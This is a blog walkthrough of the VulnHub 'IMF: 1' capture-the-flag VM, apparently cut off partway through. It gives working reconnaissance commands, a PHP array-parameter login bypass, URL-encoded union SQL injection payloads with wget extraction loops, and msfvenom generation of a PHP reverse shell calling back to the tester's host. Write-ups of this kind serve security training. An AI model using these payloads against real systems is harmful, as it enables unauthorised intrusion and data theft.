---
layout: post
title: "IMF: 1"
date: 2019-05-02 20:09:14 +0000
author: Larry Brown
category: Walkthroughs
tags: [vulnhub, base64, sqli, qr code, waf bypass, port knock, ltrace, gdb, gdb-peda]
---
<div>VulnHub URL:Â <a href="https://www.vulnhub.com/entry/imf-1,162/" target="_blank">https://www.vulnhub.com/entry/imf-1,162/</a></div>
<div>Hostname:Â imf</div>
<div>IP Address:Â 10.183.0.188</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Information Gathering/Recon</h2>
</div>
<div><br /></div>
<div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.188.</div>
<div><br /></div>
<div><br /></div>
<div>
    <h2>Service Enumeration/Scanning</h2>
</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# nmap -Pn -sT -sV -sC -A -oA imf -p 1-65535 10.183.0.188</div>
    <div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-02 16:13 EDT</div>
    <div>Nmap scan report for imf.homenet.dom (10.183.0.188)</div>
    <div>Host is up (0.0014s latency).</div>
    <div>Not shown: 65534 filtered ports</div>
    <div>PORTÂ Â Â STATE SERVICE VERSION</div>
    <div>
        <font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp openÂ Â httpÂ Â Â Â Apache httpd 2.4.18 ((Ubuntu))</font>
    </div>
    <div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> (Ubuntu)</div>
    <div>|_http-title: IMF - Homepage</div>
    <div>MAC Address: 08:00:27:A1:F5:E7 (Oracle VirtualBox virtual NIC)</div>
    <div>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</div>
    <div>Device type: general purpose</div>
    <div>Running: Linux 3.X|4.X</div>
    <div>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</div>
    <div>OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4</div>
    <div>Network Distance: 1 hop</div>
    <div>
        <div><br /></div>
    </div>
    <div>TRACEROUTE</div>
    <div>HOP RTTÂ Â Â Â Â ADDRESS</div>
    <div>1Â Â Â 1.39 ms imf.homenet.dom (10.183.0.188)</div>
    <div>
        <div><br /></div>
    </div>
    <div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div>
    <div>Nmap done: 1 IP address (1 host up) scanned in 116.36 seconds</div>
</div>
<div><br /></div>
<!--more-->
<div><br /></div>
<div>
    <h2>Gaining Access</h2>
</div>
<div><br /></div>
<div>With only one port open, we don't have to worry about where to start. ðŸ˜„ Before browsing to the default site, though, let's run nikto to see if we can get any more information than nmap returned.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# nikto -h http://10.183.0.188</div>
    <div>- Nikto v2.1.6</div>
    <div>---------------------------------------------------------------------------</div>
    <div>+ Target IP:Â Â Â Â Â Â Â Â Â Â 10.183.0.188</div>
    <div>+ Target Hostname:Â Â Â Â 10.183.0.188</div>
    <div>+ Target Port:Â Â Â Â Â Â Â Â 80</div>
    <div>+ Start Time:Â Â Â Â Â Â Â Â Â 2019-05-02 16:17:20 (GMT-4)</div>
    <div>---------------------------------------------------------------------------</div>
    <div>+ Server: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/2.4.18</font> (Ubuntu)</div>
    <div>+ The anti-clickjacking X-Frame-Options header is not present.</div>
    <div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div>
    <div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div>
    <div>+ No CGI Directories found (use '-C all' to force check all possible dirs)</div>
    <div>+ IP address found in the 'location' header. The IP is "127.0.1.1".</div>
    <div>+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".</div>
    <div>+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div>
    <div>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</div>
    <div>+ OSVDB-3233: /icons/README: Apache default file found.</div>
    <div>+ 7915 requests: 0 error(s) and 8 item(s) reported on remote host</div>
    <div>+ End Time:Â Â Â Â Â Â Â Â Â Â Â 2019-05-02 16:18:24 (GMT-4) (64 seconds)</div>
    <div>---------------------------------------------------------------------------</div>
    <div>+ 1 host(s) tested</div>
</div>
<div><br /></div>
<div>Surprisingly, nikto didn't return much of anything (that we didn't already know). Manually checking for a robots.txt file also came up empty. Time to fire up dirb to see if there is anything on this service we can dig into.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# dirb http://10.183.0.188 /usr/share/dirb/wordlists/big.txt -o dirb-http-10.183.0.188.txt</div>
    <div>
        <div><br /></div>
    </div>
    <div>-----------------</div>
    <div>DIRB v2.22</div>
    <div>By The Dark Raver</div>
    <div>-----------------</div>
    <div>
        <div><br /></div>
    </div>
    <div>OUTPUT_FILE: dirb-http-10.183.0.188.txt</div>
    <div>START_TIME: Thu MayÂ Â 2 16:18:51 2019</div>
    <div>URL_BASE: http://10.183.0.188/</div>
    <div>WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt</div>
    <div>
        <div><br /></div>
    </div>
    <div>-----------------</div>
    <div>
        <div><br /></div>
    </div>
    <div>GENERATED WORDS: 20458</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Scanning URL: http://10.183.0.188/ ----</div>
    <div>==&gt; DIRECTORY: http://10.183.0.188/css/</div>
    <div>==&gt; DIRECTORY: http://10.183.0.188/fonts/</div>
    <div>==&gt; DIRECTORY: http://10.183.0.188/images/</div>
    <div>==&gt; DIRECTORY: http://10.183.0.188/js/</div>
    <div>+ http://10.183.0.188/server-status (CODE:403|SIZE:300)</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.188/css/ ----</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.188/fonts/ ----</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.188/images/ ----</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.188/js/ ----</div>
    <div>==&gt; DIRECTORY: http://10.183.0.188/js/vendor/</div>
    <div>
        <div><br /></div>
    </div>
    <div>---- Entering directory: http://10.183.0.188/js/vendor/ ----</div>
    <div>
        <div><br /></div>
    </div>
    <div>-----------------</div>
    <div>END_TIME: Thu MayÂ Â 2 16:20:54 2019</div>
    <div>DOWNLOADED: 122748 - FOUND: 1</div>
</div>
<div><br /></div>
<div>Well, looks like we got a (very) little bit more. Time to go ahead and download the site and start digging through it manually.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# wget -m http://10.183.0.188</div>
</div>
<div><br /></div>
<div>Digging through the downloaded site, we find our first flag in a comment in the contact.php page.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>Â  Â  &lt;section id="service"&gt;</div>
    <div>Â Â Â Â Â Â Â Â &lt;div class="container"&gt;</div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">&lt;!-- flag1{YWxsdGhlZmlsZXM=} --&gt;</font>
    </div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â &lt;div class="service-wrapper"&gt;Â Â </div>
    <div>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â &lt;div class="row"&gt;</div>
</div>
<div><br /></div>
<div>The Base64Â string in the flag decodes to 'allthefiles'.Â The write up for this VM on VulnHub states that each flag is supposed to lead you to the next flag. This first flag is contained in the section of employee names, so I'm guessing the next flag has to do with one or all of the employees.</div>
<div><br /></div>
<div>The contact.php page displays a form to submit as well as a list of three employees.</div>
<div><br /></div>
<ul>
    <li>
        <div>Roger S. Michaels (<a href="mailto:rmichaels@imf.local">rmichaels@imf.local</a>)</div>
    </li>
    <li>
        <div>Alexander B. Keith (<a href="mailto:akeith@imf.local">akeith@imf.local</a>)</div>
    </li>
    <li>
        <div>Elizabeth R. Stone (<a href="mailto:estone@imf.local">estone@imf.local</a>)</div>
    </li>
</ul>
<div><br /></div>
<div>From this we can see the format of email addresses the company uses (first initial + last name), which might be helpful if we have to brute force some additional usernames/email addresses. Also, the last employee listed has a font awesome icon 'fa-file-text'. Not sure if that plays into our 'allthefiles' hint?</div>
<div><br /></div>
<div>I'll go ahead and visit the contact.php page and submit the form to see what happens... nothing at all. There doesn't seem to be any validation in the user input or any messages returned. Moving on...</div>
<div><br /></div>
<div>The projects.php page contains lots of fun names in all caps...</div>
<div><br /></div>
<ul>
    <li>
        <div>ANGRYCHASER</div>
    </li>
    <li>
        <div>ROUTECHEF</div>
    </li>
    <li>
        <div>BIZARREMASTER</div>
    </li>
    <li>
        <div>PLOWPLOW</div>
    </li>
    <li>
        <div>SILENTARK</div>
    </li>
    <li>
        <div>ODDSOUFFLE</div>
    </li>
    <li>
        <div>SPORKSQUIRREL</div>
    </li>
</ul>
<div><br /></div>
<div>Digging further into the downloaded site, we have several JS files with what appear to be random names. Having seen, though, that the flags are going to be Base64 encoded, it might be that the JS file names are encoded. Let's try to decode each file name.</div>
<div><br /></div>
<ul>
    <li>
        <div>eVlYUnZjZz09fQ==.min.js - decodes to yYXRvcg==} (this looks like a partial flag)</div>
    </li>
    <li>
        <div>XUnRhVzVwYzNS.js - decodes toÂ ]I\ (ASCII) (this looks like... junk?)</div>
    </li>
    <li>
        <div>ZmxhZzJ7YVcxbVl.js - decodes toÂ flag2{aW1mY (this looks like a partial flag)</div>
    </li>
</ul>
<div><br /></div>
<div>Interesting. This looks like we are getting close, but that middle file doesn't seem quite right. Let's see what we get if we combine all the file names and do one decode.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# echo 'ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==' | base64 -d</div>
    <div>
        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">flag2{aW1mYWRtaW5pc3RyYXRvcg==}</font>
    </div>
</div>
<div><br /></div>
<div>That's better. We've got our second flag. Now, if we decode the Base64 string inside the flag, we get the string 'imfadministrator'. Let's see if that is a new URL for our site.</div>
<div><br /></div>
<div><a href="http://10.183.0.188/imfadministrator/">http://10.183.0.188/imfadministrator/</a></div>
<div><br /></div>
<div><img height="128" src="/assets/images/2019-05-02-imf-1/D85334B0-3717-4F17-B9A1-3151AF972B40.png" width="430" /><br /></div>
<div><br /></div>
<div>Nice! We have a login form now.</div>
<div><br /></div>
<div>Checking the login page source code, we see the following comment.</div>
<div><br /></div>
<div><img height="188" src="/assets/images/2019-05-02-imf-1/02DE9A3A-4DEA-409F-83C1-C241D4CC3637.png" width="1714" /><br /></div>
<div><br /></div>
<div>Sounds like we are going to have to brute force the password instead of trying SQL injection. At least they let us know that up front so we didn't waste a bunch of time.</div>
<div><br /></div>
<div>We have a few usernames we can try (thanks to the contact page). We'll use hydra to try to brute force a login. Before doing that though, we tested the login form (using test:test) and found that it comes back with a pretty specific error.</div>
<div><br /></div>
<div><img height="162" src="/assets/images/2019-05-02-imf-1/F733EBEB-1925-4FF3-BA75-6529A8CC6D21.png" width="426" /><br /></div>
<div><br /></div>
<div>Let's see if we can try our usernames from the contact page and get a different error message.</div>
<div><br /></div>
<div>TryingÂ akeith andÂ estone resulted in the same 'Invalid username' error. However, tryingÂ rmichaels returned an 'Invalid password' error.</div>
<div><br /></div>
<div><img height="164" src="/assets/images/2019-05-02-imf-1/4A1FC9B8-5929-4B06-9FE8-4090E1BB55F1.png" width="422" /><br /></div>
<div><br /></div>
<div>Now that we have zeroed in on a valid username, we can start our brute force password attack. I started with a list of words from the projects.php page (just hoping for the best). Unfortunately, none worked. I also tried some other large dictionaries, but still got nothing. Based on Roger's comment in the page, I started to doubt if I'd ever be able to brute force the 'mad secure' password. So I started to look for alternatives.</div>
<div><br /></div>
<div>The solution here is pretty crazy, actually. After doing some digging/Googling, it appears that you can change the 'pass' parameter name to an array (with no value) and PHP will just accept that as valid (I guess, 'defined').</div>
<div><br /></div>
<div>To be able to do this little trick, I fired up Burp Suite and intercepted my login request.</div>
<div><br /></div>
<div><img height="750" src="/assets/images/2019-05-02-imf-1/85D8893E-237D-4EF8-805C-FAF7D01D3C2F.png" width="1354" /><br /></div>
<div><br /></div>
<div>Changing the 'pass' field to pass[] and forwarding on the request resulted in the following response.</div>
<div><br /></div>
<div><img height="65" src="/assets/images/2019-05-02-imf-1/1CBBE54B-DB26-44E9-89E5-10AF61644906.png" width="241" /><br /></div>
<div><br /></div>
<div>Crazy!</div>
<div><br /></div>
<div>Pulling the string out of our <span style="--inversion-type-color:  simple; color: rgb(147, 255, 5);">flag3{Y29udGludWVUT2Ntcw==}</span> flag and decoding it, we get the string 'continueTOcms'... so we'll follow the link toÂ <a href="http://10.183.0.188/imfadministrator/cms.php?pagename=home">http://10.183.0.188/imfadministrator/cms.php?pagename=home</a></div>
<div><br /></div>
<div><img height="125" src="/assets/images/2019-05-02-imf-1/CBEE676E-BDD1-424C-BAE4-29F6325797CC.png" width="369" /><br /></div>
<div><br /></div>
<div>As soon as we see this page, we jump on the 'Upload Report' link (thinking we are moments away from uploading a reverse shell), but we are greeted with the following.</div>
<div><br /></div>
<div><img height="238" src="/assets/images/2019-05-02-imf-1/E1A93D7B-4E1C-488B-AF88-FE7D13572410.png" width="730" /><br /></div>
<div><br /></div>
<div>ðŸ˜ž However, we notice the link is passing a parameter to load a specific page.</div>
<div><br /></div>
<div><a href="http://10.183.0.188/imfadministrator/cms.php?pagename=upload">http://10.183.0.188/imfadministrator/cms.php?pagename=upload</a></div>
<div><br /></div>
<div>Let's see if we can manipulate the parameter to load random files on the system.</div>
<div><br /></div>
<div><a href="http://10.183.0.188/imfadministrator/cms.php?pagename=../../../../../../etc/passwd">http://10.183.0.188/imfadministrator/cms.php?pagename=../../../../../../etc/passwd</a></div>
<div><br /></div>
<div>Nope! Let's see if the upload 'page' is something being loaded from within the same directory.</div>
<div><br /></div>
<div>Trying <a href="http://10.183.0.188/imfadministrator/upload.html">http://10.183.0.188/imfadministrator/upload.html</a>...</div>
<div>TryingÂ <a href="http://10.183.0.188/imfadministrator/upload.php">http://10.183.0.188/imfadministrator/upload.php</a>...</div>
<div><br /></div>
<div>Nope! and Nope!</div>
<div><br /></div>
<div>Let's see if the upload parameter might be vulnerable to SQL injection (despite the comment from earlier about not being able to get the database working). We'll try to add a single quote to the parameter to see if things break.</div>
<div><br /></div>
<div>TryingÂ <a href="http://10.183.0.188/imfadministrator/cms.php?pagename=upload%27">http://10.183.0.188/imfadministrator/cms.php?pagename=upload%27</a>...</div>
<div><br /></div>
<div><img height="270" src="/assets/images/2019-05-02-imf-1/0925F0D3-4901-4CFA-8AF8-1D27C233620D.png" width="1872" /><br /></div>
<div><br /></div>
<div>OK. Might be getting somewhere with this. After trying lots of things, I was finally able to start getting queries to work using the following format for the pagename query string parameter</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>pagename=1' union select (QUERY) order by '1</div>
</div>
<div><br /></div>
<div>For example, I was able to retrieve the database version using the URLÂ <a href="http://10.183.0.188/imfadministrator/cms.php?pagename=1%27%20union%20select%20(select%20@@version)%20order%20by%20%271">http://10.183.0.188/imfadministrator/cms.php?pagename=1%27%20union%20select%20(select%20@@version)%20order%20by%20%271</a></div>
<div><br /></div>
<div><img height="230" src="/assets/images/2019-05-02-imf-1/8D17716F-8FF8-44F0-9353-DED3128ED11D.png" width="730" /><br /></div>
<div><br /></div>
<div>This worked fine for executing built-in commands, but when I tried to start pulling schema data, I started running into an error due to my subqueries returning null. Digging more into SQL syntax (and with some help from sqlmap), I was able to improve my query by wrapping my column names with the 'ifnull' and 'cast' functions.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>pagename=1' union all select concat_ws(0x2E, 0x23, ifnull(cast(%column_name% as char),0x20), 0x23) from %schema.table% limit 1 offset %num%#</div>
</div>
<div><br /></div>
<div class="note"><b>NOTE:</b> I put percent signs (%) around fields we will change based on our query.</div>
<div class="note"><b>NOTE:</b> I'm using concat_ws (concat with separator) to combine my columns into one string. The first parameter is the separator (0x2E =Â '.'). I'm also placing aÂ '#'Â sign (0x23) at the start and end of my list of columns. This will result in a value like %.col1.col2.col3.%, which should make it easier to parse out of the page using grep.</div>
<div><br /></div>
<div>The ifnull statement will return the second parameter (in my case, a space) if the first parameter comes back as null. We are also ensuring all values get returned as text.</div>
<div><br /></div>
<div>Another key to getting things working properly was to URL encode the query so the 'hash' character at the end of the query string isn't viewed as an anchor in the page, but is actually passed along to the backend (as a comment character). When doing SQL injection into a form, you don't have to worry about this... but doing SQL injection through a query string, you really need to URL encode it.</div>
<div><br /></div>
<div>Now that I've got a working query, I can download all the database schema information (databases, tables, columns... excluding system databases) using the following query...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>pagename=1' union all select concat_ws(0x2E, 0x23, ifnull(cast(<font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">table_schema</font> as char),0x20), ifnull(cast(<font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">table_name</font> as char),0x20), ifnull(cast(<font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">column_name</font> as char),0x20), 0x23) from <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">information_schema.columns</font> where table_schema != 'performance_schema' and table_schema != 'information_schema' and table_schema != 'sys' and table_schema != 'mysql' limit 1 offset <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0</font>#</div>
</div>
<div><br /></div>
<div class="note"><b>NOTE:</b> I put the fields from earlier that were marked with percent sings in green.</div>
<div><br /></div>
<div>Set in a loop (and URL encoded)...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>for num in $(seq 0 500); do wget -q -O ${num}.html --header="Cookie: PHPSESSID=cg3jnchk94fv0qjn8ca8ttv4t2" "http://10.183.0.188/imfadministrator/cms.php?pagename=1%27%20union%20all%20select%20concat_ws%280x2E%2C%200x23%2C%20ifnull%28cast%28table_schema%20as%20char%29%2C0x20%29%2C%20ifnull%28cast%28table_name%20as%20char%29%2C0x20%29%2C%20ifnull%28cast%28column_name%20as%20char%29%2C0x20%29%2C%200x23%29%20from%20information_schema.columns%20where%20table_schema%20%21%3D%20%27performance_schema%27%20and%20table_schema%20%21%3D%20%27information_schema%27%20and%20table_schema%20%21%3D%20%27sys%27%20and%20table_schema%20%21%3D%20%27mysql%27%20limit%201%20offset%20${num}%23"; done</div>
</div>
<div><br /></div>
<div>Then I can extract the information from the HTML files using grep.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf/sqli# grep -Po '#\..*?\.#' * | cut -d ':' -f 2 | cut -d '.' -f 2-4 | sort -u</div>
    <div>admin.pages.id</div>
    <div>admin.pages.pagedata</div>
    <div>admin.pages.pagename</div>
</div>
<div><br /></div>
<div>We only have one non-system database (admin) with one table (pages) with three columns (id, pagedata, pagename). We'll pull the available pagenames to see if there is a working 'upload' page (or anything else interesting).</div>
<div><br /></div>
<div>Our query...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>pagename=1' union all select concat_ws(0x2E, 0x23, ifnull(cast(pagename as char),0x20), 0x23) from admin.pages limit 1 offset 0#</div>
</div>
<div><br /></div>
<div>Set in a loop (and URL encoded)...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>for num in $(seq 0 500); do wget -q -O ${num}.html --header="Cookie: PHPSESSID=cg3jnchk94fv0qjn8ca8ttv4t2" "http://10.183.0.188/imfadministrator/cms.php?pagename=1%27%20union%20all%20select%20concat_ws%280x2E%2C%200x23%2C%20ifnull%28cast%28pagename%20as%20char%29%2C0x20%29%2C%200x23%29%20from%20admin.pages%20limit%201%20offset%20${num}%23"; done</div>
</div>
<div><br /></div>
<div>Then extracting results using grep...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf/sqli# grep -Po '#\..*?\.#' * | cut -d ':' -f 2 | cut -d '.' -f 2 | sort -u</div>
    <div>disavowlist</div>
    <div>home</div>
    <div>tutorials-incomplete</div>
    <div>upload</div>
</div>
<div><br /></div>
<div>Looks like there is only one additional page we don't know about. Let's check it out.</div>
<div><br /></div>
<div><a href="http://10.183.0.188/imfadministrator/cms.php?pagename=tutorials-incomplete">http://10.183.0.188/imfadministrator/cms.php?pagename=tutorials-incomplete</a></div>
<div><br /></div>
<div><img height="1074" src="/assets/images/2019-05-02-imf-1/CA8A783D-BE4D-4162-B420-60583A97C27C.png" width="1446" /><br /></div>
<div><br /></div>
<div>Interesting. We have an image with lots of writing on a white board, plus a QR code. We'll download the image and see what's in the QR code (usingÂ zbarimg).</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# wget http://10.183.0.188/imfadministrator/images/whiteboard.jpg</div>
    <div>--2019-05-03 10:04:01--Â Â http://10.183.0.188/imfadministrator/images/whiteboard.jpg</div>
    <div>Connecting to 10.183.0.188:80... connected.</div>
    <div>HTTP request sent, awaiting response... 200 OK</div>
    <div>Length: 58816 (57K) [image/jpeg]</div>
    <div>Saving to: 'whiteboard.jpg'Â Â Â </div>
    <div>
        <div><br /></div>
    </div>
    <div>whiteboard.jpgÂ Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â 100%[=======================================================================&gt;]Â Â 57.44KÂ Â --.-KB/sÂ Â Â Â in 0s</div>
    <div>
        <div><br /></div>
    </div>
    <div>2019-05-03 10:04:01 (161 MB/s) - 'whiteboard.jpg' saved [58816/58816]</div>
    <div>root@kali:~/Walkthroughs/imf# zbarimg whiteboard.jpg </div>
    <div>QR-Code:<font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">flag4{dXBsb2Fkcjk0Mi5waHA=}</font>
    </div>
    <div>scanned 1 barcode symbols from 1 images in 0.11 seconds</div>
</div>
<div><br /></div>
<div>Nice! We found another flag. Let's see what's inside.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# echo 'dXBsb2Fkcjk0Mi5waHA=' | base64 -d</div>
    <div>uploadr942.php</div>
</div>
<div><br /></div>
<div>Finally! An upload page. ðŸ˜„</div>
<div><br /></div>
<div><a href="http://10.183.0.188/imfadministrator/uploadr942.php">http://10.183.0.188/imfadministrator/uploadr942.php</a></div>
<div><br /></div>
<div><img height="228" src="/assets/images/2019-05-02-imf-1/354B5E5C-BF82-4D5E-B504-BB3FA1919452.png" width="714" /><br /></div>
<div><br /></div>
<div>At this point, we don't know if there are any file restrictions, so we'll just create a PHP reverse shell (using msfvenom) and try to upload it.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/imf# msfvenom -p php/reverse_php LHOST=10.183.0.222 LPORT=443 -f raw &gt; rev.php</div>
    <div>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</div>
    <div>[-] No arch selected, selecting arch: php from the payload</div>
    <div>No encoder or badchars specified, outputting raw payload</div>
    <div>Payload size: 3026 bytes</div>
</div>
<div><br /></div>
<div>Trying to upload the PHP file "as is" resulted in a error (Error: Invalid file type.). I'll rename the file with a .jpg extension and see if that works.</div>
<div><br /></div>
<div><img height="298" src="/assets/images/2019-05-02-imf-1/792D7CCE-73E3-4633-9C0C-2BB82C4EB4DE.png" width="1032" /><br /></div>
<div><br /></div>
<div>OK. Not going to be easy. Nothing has so far, so I'm not surprised. Let's try base64 encoding our payload and see if that works.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
